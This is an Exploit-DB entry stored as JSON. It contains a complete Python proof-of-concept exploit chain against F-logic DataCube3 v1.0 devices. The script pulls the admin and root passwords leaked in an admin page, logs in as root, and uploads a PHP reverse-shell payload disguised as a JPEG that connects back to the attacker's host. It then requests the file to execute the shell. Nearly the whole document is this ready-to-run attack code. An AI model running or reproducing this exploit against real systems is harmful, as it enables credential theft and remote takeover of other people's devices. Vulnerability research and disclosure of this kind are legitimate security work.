{"source": "https://www.exploit-db.com/exploits/51868", "vulnName": "DataCube3 v1.0 - Unrestricted file upload 'RCE'", "vulnEDBID": "51868", "vulnCVE": "2024-25832 2024-25830", "author": "SAMY YOUNSI - NS LABS", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-10", "vulnContent": "# Exploit Title: DataCube3 v1.0 - Unrestricted file upload 'RCE'\n# Date: 7/28/2022\n# Exploit Author: Samy Younsi - NS Labs (https://neroteam.com)\n# Vendor Homepage: https://www.f-logic.jp\n# Software Link: https://www.f-logic.jp/pdf/support/manual_product/manual_product_datacube3_ver1.0_sc.pdf\n# Version: Ver1.0\n# Tested on: DataCube3 version 1.0 (Ubuntu)\n# CVE : CVE-2024-25830 + CVE-2024-25832\n\n# Exploit chain reverse shell, information disclosure (root password leak) + unrestricted file upload\n\nfrom __future__ import print_function, unicode_literals\nfrom bs4 import BeautifulSoup\nimport argparse\nimport requests\nimport json\nimport urllib3\nimport re\nurllib3.disable_warnings()\n\ndef banner():\n  dataCube3Logo = \"\"\" \n        \u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\n      \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2588        DataCube3   Ver1.0      \u2588F-logic\u2593\u2593\n      \u2592\u2592\u2588\u2588\u2588\u2588\u2592\u2592\u2588\u2588        \u2588\u2588\u2588\u2588        \u2588\u2588\u2588\u2588        \u2588\u2588\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\n      \u2592\u2592\u2588\u2588\u2588\u2588\u2592\u2592\u2588\u2588        \u2588\u2588\u2588\u2588        \u2588\u2588\u2588\u2588        \u2588\u2588\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\n      \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2588        \u2588\u2588\u2588\u2588        \u2588\u2588\u2588\u2588        \u2588\u2588\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\n      \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2588                                \u2588\u2588\u2593\u2593\u2588\u2588\u2588\u2588\u2593\u2593\n      \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2588        \u2588\u2588             \u2588\u2588       \u2588\u2588\u2593\u2593\u2588\u2588\u2588\u2588\u2593\u2593\n      \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2588        \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588       \u2588\u2588\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\n        \u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2593\u2593\u2593\u2593\u2593                                       \n                                                                                 \n\\033[1;92mSamy Younsi (Necrum Security Labs)\\033[1;m         \\033[1;91mDataCube3 exploit chain reverse shell\\033[1;m                                                 \n                FOR EDUCATIONAL PURPOSE ONLY.   \n  \"\"\"\n  return print('\\033[1;94m{}\\033[1;m'.format(dataCube3Logo))\n\n\ndef extractRootPwd(RHOST, RPORT, protocol):\n  url = '{}://{}:{}/admin/config_all.php'.format(protocol, RHOST, RPORT)\n  try:\n    response = requests.get(url, allow_redirects=False, verify=False, timeout=20)\n    if response.status_code != 302:\n      print('[!] \\033[1;91mError: DataCube3 web interface is not reachable. Make sure the specified IP is correct.\\033[1;m')\n      exit()\n    soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser')\n    scriptTag = str(soup.find_all('script')[12]).replace(' ', '')\n    rawLeakedData = re.findall('configData:.*,', scriptTag)[0]\n    jsonLeakedData = json.loads('[{}]'.format(rawLeakedData.split('configData:[')[1].split('],')[0]))\n    adminPassword = jsonLeakedData[12]['value']\n    rootPassword = jsonLeakedData[14]['value']\n    print('[INFO] DataCube3 leaked credentials successfully extracted: admin:{} | root:{}.\\n[INFO] The target must be vulnerable.'.format(adminPassword, rootPassword))\n    return rootPassword\n  except:\n    print('[ERROR] Can\\'t grab the DataCube3 version...')\n\n\ndef generateAuthCookie(RHOST, RPORT, protocol, rootPassword):\n  print('[INFO] Generating DataCube3 auth cookie ...')\n  url = '{}://{}:{}/admin/config_all.php'.format(protocol, RHOST, RPORT)\n  data = {\n    'user_id': 'root',\n    'user_pw': rootPassword,\n    'login': '%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3'\n  }\n  try:\n    response = requests.post(url, data=data, allow_redirects=False, verify=False, timeout=20)\n    if response.status_code != 302:\n      print('[!] \\033[1;91mError: An error occur while trying to get the auth cookie, is the root password correct?\\033[1;m')\n      exit()\n    authCookie = response.cookies.get_dict() \n    print('[INFO] Authentication successful! Auth Cookie: {}'.format(authCookie))  \n    return authCookie\n  except:\n    print('[ERROR] Can\\'t grab the auth cookie, is the root password correct?')\n\n\ndef extractAccesstime(RHOST, RPORT, LHOST, LPORT, protocol, authCookie):\n  print('[INFO] Extracting Accesstime ...')\n  url = '{}://{}:{}/admin/setting_photo.php'.format(protocol, RHOST, RPORT)\n  try:\n    response = requests.get(url, cookies=authCookie, allow_redirects=False, verify=False, timeout=20)\n    if response.status_code != 302:\n      print('[!] \\033[1;91mError: An error occur while trying to get the accesstime value.\\033[1;m')\n      exit()\n    soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser')\n    accessTime = soup.find('input', {'name': 'accesstime'}).get('value')\n    print('[INFO] AccessTime value: {}'.format(accessTime))\n    return accessTime\n  except:\n    print('[ERROR] Can\\'t grab the accesstime value, is the root password correct?')\n\n\ndef injectReverseShell(RHOST, RPORT, LHOST, LPORT, protocol, authCookie, accessTime):\n  print('[INFO] Injecting PHP reverse shell script ...')\n  filename='rvs.php'\n  payload = '<?php $sock=fsockopen(\"{}\",{});$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'.format(LHOST, LPORT)\n\n  data = '-----------------------------113389720123090127612523184396\\r\\nContent-Disposition: form-data; name=\"add\"\\r\\n\\r\\n\u00e5\ufffd\ufffd\u00e7\ufffd\ufffd\u00e8\u00bf\u00bd\u00e5\ufffd\\xA0\\r\\n-----------------------------113389720123090127612523184396\\r\\nContent-Disposition: form-data; name=\"addPhoto\"; filename=\"{}\"\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n{}\\r\\n-----------------------------113389720123090127612523184396\\r\\nContent-Disposition: form-data; name=\"accesstime\"\\r\\n\\r\\n{}\\r\\n-----------------------------113389720123090127612523184396--\\r\\n'.format(filename, payload, accessTime)\n\n  headers = {\n      'Content-Type': 'multipart/form-data; boundary=---------------------------113389720123090127612523184396'\n  }\n  url = '{}://{}:{}/admin/setting_photo.php'.format(protocol, RHOST, RPORT)\n  try:\n    response = requests.post(url, cookies=authCookie, headers=headers, data=data, allow_redirects=False, verify=False, timeout=20)\n    if response.status_code != 302:\n        print('[!] \\033[1;91mError: An error occur while trying to upload the PHP reverse shell script.\\033[1;m')\n        exit()\n    shellURL = '{}://{}:{}/images/slideshow/{}'.format(protocol, RHOST, RPORT, filename)\n    print('[INFO] PHP reverse shell script successfully uploaded!\\n[INFO] SHELL URL: {}'.format(shellURL))\n    return shellURL\n  except:\n    print('[ERROR] Can\\'t upload the PHP reverse shell script, is the root password correct?')\n\n\ndef execReverseShell(shellURL):\n  print('[INFO] Executing reverse shell...')\n  try:\n    response = requests.get(shellURL, allow_redirects=False, verify=False)\n    print('[INFO] Reverse shell successfully executed.')\n    return\n  except Exception as e:\n      print('[ERROR] Reverse shell failed. Make sure the DataCube3 device can reach the host {}:{}')\n      return False\n\n\ndef main():\n  banner()\n  args = parser.parse_args()\n  protocol = 'https' if args.RPORT == 443 else 'http'\n  rootPassword = extractRootPwd(args.RHOST, args.RPORT, protocol)\n  authCookie = generateAuthCookie(args.RHOST, args.RPORT, protocol, rootPassword)\n  accessTime = extractAccesstime(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie)\n  shellURL = injectReverseShell(args.RHOST, args.RPORT, args.LHOST, args.LPORT, protocol, authCookie, accessTime)\n  execReverseShell(shellURL)\n\n\nif __name__ == '__main__':\n  parser = argparse.ArgumentParser(description='Script PoC that exploit an unauthenticated remote command injection on f-logic DataCube3 devices.', add_help=False)\n  parser.add_argument('--RHOST', help='Refers to the IP of the target machine. (f-logic DataCube3 device)', type=str, required=True)\n  parser.add_argument('--RPORT', help='Refers to the open port of the target machine. (443 by default)', type=int, required=True)\n  parser.add_argument('--LHOST', help='Refers to the IP of your machine.', type=str, required=True)\n  parser.add_argument('--LPORT', help='Refers to the open port of your machine.', type=int, required=True)\n  main()\n            "}